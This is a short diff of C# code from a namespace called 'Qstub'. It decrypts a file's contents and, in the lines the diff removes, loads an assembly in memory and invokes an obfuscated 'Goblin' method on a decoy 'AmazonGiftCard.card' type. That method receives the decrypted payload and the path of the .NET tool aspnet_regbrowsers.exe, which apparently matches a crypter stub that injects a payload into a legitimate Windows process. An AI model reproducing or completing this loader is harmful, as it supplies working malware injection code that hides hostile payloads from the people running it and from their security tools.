@@ -80,12 +80,6 @@ namespace Qstub
 
             string Fido = File.ReadAllText(pp);
             byte[] Husky = deco(kyes, Fido);
-
-            var wow = BindingFlags.InvokeMethod;
-            Assembly mycar = Assembly.Load(Sexy);
-            object carobject = new object[] { @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_regbrowsers.exe", string.Empty, Husky, true };
-            
-            mycar.GetType("AmazonGiftCard.card").InvokeMember("Goblin", wow, null, "<=FLYWQEQWEQWEQWEWQ=>", (object[])carobject);
         }
 
         public static string Makehome(string link)
